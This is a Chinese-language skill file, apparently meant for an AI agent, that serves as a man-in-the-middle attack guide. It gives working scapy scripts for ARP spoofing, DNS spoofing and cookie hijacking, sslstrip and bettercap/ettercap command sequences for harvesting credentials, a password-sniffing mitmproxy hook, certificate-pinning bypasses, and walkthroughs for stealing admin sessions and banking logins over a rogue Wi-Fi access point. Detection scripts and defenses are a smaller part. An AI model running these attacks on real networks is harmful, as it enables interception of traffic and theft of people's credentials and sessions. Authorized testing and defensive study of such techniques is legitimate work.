---
name: mitm
description: 中间人攻击(MITM) - 包含ARP欺骗/DNS欺骗/SSL剥离/会话劫持、多场景适配、防御检测。用于网络渗透测试和流量分析。
---

# 中间人攻击(MITM)深度利用与防御

## 1. 漏洞概述

### 1.1 基本信息
- **攻击名称**: 中间人攻击 (Man-in-the-Middle, MITM)
- **类型**: 网络层攻击
- **严重程度**: Critical (可窃取所有通信)
- **影响范围**: 所有未加密/弱加密的网络通信
- **利用难度**: 中等

### 1.2 攻击描述
中间人攻击是攻击者秘密插入到两方通信之间，拦截、窃听、篡改双方的通信内容，而通信双方并不知情。

### 1.3 MITM类型

| 类型 | 协议层 | 攻击方式 |
|------|--------|----------|
| **ARP欺骗** | 数据链路层 | 伪造ARP响应 |
| **DNS欺骗** | 应用层 | 伪造DNS响应 |
| **DHCP欺骗** | 数据链路层 | 伪造DHCP响应 |
| **SSL剥离** | 应用层 | 降级HTTPS |
| **会话劫持** | 应用层 | 窃取会话Token |
| **Wi-Fi钓鱼** | 物理层 | 伪造AP |

---

## 2. 技术原理

### 2.1 ARP欺骗原理

```
正常通信:
[受害者 PC] --[ARP: 谁是192.168.1.1?]--> [网关]
[网关] --[ARP: 192.168.1.1是AA:BB:CC]--> [受害者 PC]

ARP欺骗:
[攻击者] --[伪造ARP: 192.168.1.1是DD:EE:FF]--> [受害者 PC]
[攻击者] --[伪造ARP: 192.168.1.100是DD:EE:FF]--> [网关]

结果:
[受害者 PC] --> 所有流量 --> [攻击者] --> [网关]
[网关] --> 所有流量 --> [攻击者] --> [受害者 PC]
```

### 2.2 ARP协议分析

```python
#!/usr/bin/env python3
"""
ARP协议结构
"""

from scapy.all import *

# ARP包结构
"""
###[ ARP ]### 
  hwtype    = 0x1          # 硬件类型 (以太网)
  ptype     = 0x800        # 协议类型 (IPv4)
  hwlen     = 6            # MAC地址长度
  plen      = 4            # IP地址长度
  op        = is-at        # 操作类型 (1=请求, 2=响应)
  hwsrc     = aa:bb:cc:dd:ee:ff  # 源MAC
  psrc      = 192.168.1.1  # 源IP (伪造的)
  hwdst     = 11:22:33:44:55:66  # 目标MAC
  pdst      = 192.168.1.100     # 目标IP
"""
```

### 2.3 DNS欺骗原理

```
正常DNS查询:
[客户端] --[DNS查询: www.google.com=?]--> [DNS服务器]
[DNS服务器] --[DNS响应: 142.250.1.1]--> [客户端]

DNS欺骗:
[攻击者] --[伪造DNS响应: www.google.com=恶意IP]--> [客户端]
(攻击者响应比真实DNS服务器更快)
```

---

## 3. 漏洞识别

### 3.1 检测ARP欺骗

```python
#!/usr/bin/env python3
"""
ARP欺骗检测脚本
"""

import time
from scapy.all import *

# 存储IP-MAC映射
arp_table = {}

def detect_arp_spoof(pkt):
    """检测ARP欺骗"""
    if pkt.haslayer(ARP):
        if pkt[ARP].op == 2:  # ARP响应
            ip = pkt[ARP].psrc
            mac = pkt[ARP].hwsrc
            
            # 检查是否已存在映射
            if ip in arp_table:
                if arp_table[ip] != mac:
                    print(f"[!] 检测到ARP欺骗!")
                    print(f"    IP: {ip}")
                    print(f"    原MAC: {arp_table[ip]}")
                    print(f"    新MAC: {mac}")
                    return True
            else:
                arp_table[ip] = mac
    return False

def monitor():
    """监听网络"""
    print("[*] 开始监听ARP包...")
    sniff(prn=detect_arp_spoof, filter="arp", store=0)

if __name__ == "__main__":
    monitor()
```

### 3.2 检测DNS欺骗

```python
#!/usr/bin/env python3
"""
DNS欺骗检测脚本
"""

import dns.resolver

def check_dns_spoof(domain, expected_ip):
    """检查DNS是否被污染"""
    try:
        answers = dns.resolver.resolve(domain, 'A')
        resolved_ips = [rdata.address for rdata in answers]
        
        if expected_ip not in resolved_ips:
            print(f"[!] 检测到DNS污染!")
            print(f"    域名: {domain}")
            print(f"    预期IP: {expected_ip}")
            print(f"    实际IP: {resolved_ips}")
            return True
        else:
            print(f"[+] DNS解析正常: {domain} -> {expected_ip}")
            return False
            
    except Exception as e:
        print(f"[!] DNS查询错误: {e}")
        return None

if __name__ == "__main__":
    # 测试常见域名
    test_cases = [
        ("www.google.com", "142.250.1.1"),
        ("www.github.com", "140.82.121.3"),
    ]
    
    for domain, expected in test_cases:
        check_dns_spoof(domain, expected)
```

---

## 4. 利用技术

### 4.1 ARP欺骗攻击

```python
#!/usr/bin/env python3
"""
ARP欺骗攻击脚本
警告: 仅用于授权测试!
"""

import time
import threading
from scapy.all import *

class ARPSpoofer:
    def __init__(self, target_ip, gateway_ip, interface="eth0"):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.running = False
        
    def get_mac(self, ip):
        """获取目标MAC地址"""
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp_request
        
        response = srp(packet, timeout=2, verbose=False, iface=self.interface)
        if response[0]:
            return response[0][0][1].hwsrc
        return None
        
    def spoof(self, target_ip, spoof_ip, target_mac):
        """发送伪造ARP包"""
        packet = ARP(
            op=2,  # is-at (响应)
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip
        )
        send(packet, verbose=False, iface=self.interface)
        
    def restore(self, target_ip, target_mac, source_ip, source_mac):
        """恢复ARP表"""
        packet = ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=source_ip,
            hwsrc=source_mac
        )
        send(packet, count=4, verbose=False, iface=self.interface)
        
    def start(self):
        """开始ARP欺骗"""
        print(f"[*] 目标: {self.target_ip}")
        print(f"[*] 网关: {self.gateway_ip}")
        
        target_mac = self.get_mac(self.target_ip)
        gateway_mac = self.get_mac(self.gateway_ip)
        
        if not target_mac or not gateway_mac:
            print("[!] 无法获取MAC地址")
            return
            
        print(f"[*] 目标MAC: {target_mac}")
        print(f"[*] 网关MAC: {gateway_mac}")
        
        self.running = True
        
        try:
            while self.running:
                # 欺骗目标: 网关MAC = 攻击者MAC
                self.spoof(self.target_ip, self.gateway_ip, target_mac)
                # 欺骗网关: 目标MAC = 攻击者MAC
                self.spoof(self.gateway_ip, self.target_ip, gateway_mac)
                
                time.sleep(2)
                
        except KeyboardInterrupt:
            print("\n[*] 停止攻击，恢复ARP表...")
            self.restore(self.target_ip, target_mac, self.gateway_ip, gateway_mac)
            self.restore(self.gateway_ip, gateway_mac, self.target_ip, target_mac)
            print("[+] 已恢复")
            
    def stop(self):
        self.running = False

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 3:
        print("用法: python arp_spoof.py <目标IP> <网关IP>")
        print("示例: python arp_spoof.py 192.168.1.100 192.168.1.1")
        sys.exit(1)
        
    spoofer = ARPSpoofer(sys.argv[1], sys.argv[2])
    spoofer.start()
```

### 4.2 DNS欺骗攻击

```python
#!/usr/bin/env python3
"""
DNS欺骗攻击脚本
警告: 仅用于授权测试!
"""

from scapy.all import *

class DNSSpoofer:
    def __init__(self, interface="eth0"):
        self.interface = interface
        self.spoof_map = {
            "www.google.com": "192.168.1.100",
            "www.facebook.com": "192.168.1.100",
        }
        
    def handle_dns(self, pkt):
        """处理DNS请求"""
        if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
            query = pkt[DNSQR].qname.decode().rstrip('.')
            
            if query in self.spoof_map:
                spoofed_ip = self.spoof_map[query]
                
                # 构造伪造响应
                response = IP(
                    dst=pkt[IP].src,
                    src=pkt[IP].dst
                ) / UDP(
                    dport=pkt[UDP].sport,
                    sport=pkt[UDP].dport
                ) / DNS(
                    id=pkt[DNS].id,
                    qr=1,  # 响应
                    aa=1,  # 权威回答
                    qd=pkt[DNS].qd,
                    an=DNSRR(
                        rrname=pkt[DNS].qd.qname,
                        ttl=10,
                        rdata=spoofed_ip
                    )
                )
                
                send(response, verbose=False, iface=self.interface)
                print(f"[*] DNS欺骗: {query} -> {spoofed_ip}")
                
    def start(self):
        """开始监听"""
        print("[*] 开始DNS欺骗...")
        print(f"[*] 欺骗映射: {self.spoof_map}")
        
        sniff(
            filter="udp port 53",
            prn=self.handle_dns,
            store=0,
            iface=self.interface
        )

if __name__ == "__main__":
    spoofer = DNSSpoofer()
    spoofer.start()
```

### 4.3 SSL剥离攻击

```bash
# 使用sslstrip
# 1. 开启IP转发
echo 1 > /proc/sys/net/ipv4/ip_forward

# 2. 配置iptables重定向HTTPS到HTTP
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# 3. ARP欺骗
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# 4. 启动sslstrip
sslstrip -l 8080

# 5. 查看捕获的凭证
cat sslstrip.log
```

### 4.4 会话劫持

```python
#!/usr/bin/env python3
"""
会话劫持脚本
从流量中提取会话Cookie
"""

from scapy.all import *

class SessionHijacker:
    def __init__(self):
        self.sessions = {}
        
    def extract_cookies(self, pkt):
        """从HTTP流量中提取Cookie"""
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            payload = pkt[Raw].load.decode('utf-8', errors='ignore')
            
            # 检查HTTP请求
            if 'Cookie:' in payload:
                lines = payload.split('\r\n')
                for line in lines:
                    if line.startswith('Cookie:'):
                        cookie = line.replace('Cookie: ', '')
                        
                        # 提取主机名
                        host = ""
                        for l in lines:
                            if l.startswith('Host:'):
                                host = l.replace('Host: ', '')
                                break
                        
                        print(f"\n[+] 发现会话Cookie!")
                        print(f"    Host: {host}")
                        print(f"    Cookie: {cookie}")
                        print(f"    Source: {pkt[IP].src}")
                        
                        self.sessions[host] = {
                            'cookie': cookie,
                            'source_ip': pkt[IP].src
                        }
                        
    def start(self, interface="eth0"):
        """开始监听"""
        print("[*] 开始监听HTTP流量...")
        print("[*] 按Ctrl+C停止")
        
        sniff(
            filter="tcp port 80",
            prn=self.extract_cookies,
            store=0,
            iface=interface
        )

if __name__ == "__main__":
    hijacker = SessionHijacker()
    hijacker.start()
```

---

## 5. 场景适配

### 5.1 不同网络环境

| 环境 | 攻击方式 | 工具 |
|------|----------|------|
| **局域网** | ARP欺骗 | arpspoof, ettercap |
| **公共Wi-Fi** | 伪造AP | hostapd, airbase-ng |
| **企业网络** | DHCP欺骗 | yersinia |
| **互联网** | DNS劫持 | DNS污染 |

### 5.2 不同目标

| 目标 | 攻击重点 | 工具 |
|------|----------|------|
| **Web应用** | 会话Cookie | sslstrip, mitmproxy |
| **移动设备** | HTTPS降级 | burp suite |
| **IoT设备** | 固件更新 | firmware分析 |
| **API** | Token窃取 | Wireshark |

### 5.3 攻击链

```
1. 网络探测 → 2. ARP/DNS欺骗 → 3. 流量拦截 → 4. SSL剥离 → 5. 凭证窃取
```

---

## 6. 绕过技术

### 6.1 HSTS绕过

```bash
# 使用hstsstrip
# 1. 移除HSTS头
# 2. 注入缓存控制头

# 或使用域名变种
www.google.com -> www.google.com.evil.com
```

### 6.2 证书锁定绕过

```bash
# Android
adb shell "echo '<cert_hash>' >> /data/system/users/0/cacerts-added"

# iOS
# 使用SSL Kill Switch 2
# 越狱后安装
```

### 6.3 双向SSL绕过

```python
# 提取客户端证书
# 1. 反编译APK
# 2. 查找.p12/.keystore文件
# 3. 导入到Burp Suite
```

---

## 7. 防御与检测

### 7.1 ARP防护

```bash
# 静态ARP表
arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff

# ARP防火墙
arpwatch
arpon

# 网络设备配置
# 交换机端口安全
switchport port-security
```

### 7.2 DNS防护

```bash
# 使用DNSSEC
# 使用DNS over HTTPS (DoH)
# 使用DNS over TLS (DoT)

# 配置示例 (systemd-resolved)
[Resolve]
DNS=1.1.1.1 8.8.8.8
DNSOverTLS=opportunistic
```

### 7.3 HTTPS防护

```nginx
# Nginx配置HSTS
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

# 证书锁定
# 使用HPKP (已弃用) 或 Certificate Transparency
```

### 7.4 检测规则

```yaml
# Suricata规则
alert arp any any -> any any (msg:"ARP Spoof Detected"; \
    arp.opcode == 2; \
    threshold:type both, track by_src, count 10, seconds 60; \
    sid:1000001;)

alert dns any any -> any 53 (msg:"DNS Spoof Detected"; \
    dns.query; content:"google.com"; \
    dns.rrtype == A; dns.a; content:!142.250.0.0/16; \
    sid:1000002;)
```

---

## 8. 自动化工具

### 8.1 Ettercap

```bash
# 图形界面
ettercap -G

# 命令行 - ARP欺骗
ettercap -i eth0 -T -M arp:remote /192.168.1.100// /192.168.1.1//

# DNS欺骗插件
ettercap -i eth0 -T -M arp:remote // // -P dns_spoof

# SSL剥离
ettercap -i eth0 -T -M arp:remote // // -P sslstrip
```

### 8.2 Bettercap

```bash
# 启动
sudo bettercap -iface eth0

# ARP欺骗
arp.spoof on

# DNS欺骗
set dns.spoof.domains google.com,facebook.com
set dns.spoof.address 192.168.1.100
dns.spoof on

# HTTPS降级
http.proxy on
```

### 8.3 Mitmproxy

```bash
# 透明代理
mitmproxy --mode transparent --showhost

# 常规代理
mitmproxy --listen-host 0.0.0.0 --listen-port 8080

# 保存流量
mitmproxy -w capture.mitm

# Python脚本扩展
from mitmproxy import http

def request(flow: http.HTTPFlow):
    if "password" in flow.request.text:
        print(f"[+] 发现密码: {flow.request.text}")
```

---

## 9. 实战案例

### 9.1 企业内网渗透

**目标**: 窃取管理员会话

**步骤**:
1. 接入内网
2. 扫描网段发现网关和管理员IP
3. ARP欺骗
4. 流量分析
5. 提取会话Cookie
6. 劫持管理后台

### 9.2 公共Wi-Fi钓鱼

**目标**: 窃取用户凭证

**步骤**:
1. 创建伪造AP
2. 配置DHCP和DNS
3. 用户连接后DNS欺骗
4. 用户访问银行网站被重定向
5. 窃取登录凭证

---

## 10. 参考资源

### 10.1 学习资源
- [OWASP MITM](https://owasp.org/www-community/attacks/Man-in-the-middle_attack)
- [Bettercap文档](https://www.bettercap.org/)

### 10.2 工具
- Bettercap
- Ettercap
- Mitmproxy
- Wireshark

### 10.3 防护
- HSTS
- DNSSEC
- Certificate Pinning

---

*目标: 成为世界第一黑客 + AI安全专家*
*类型: 网络渗透*
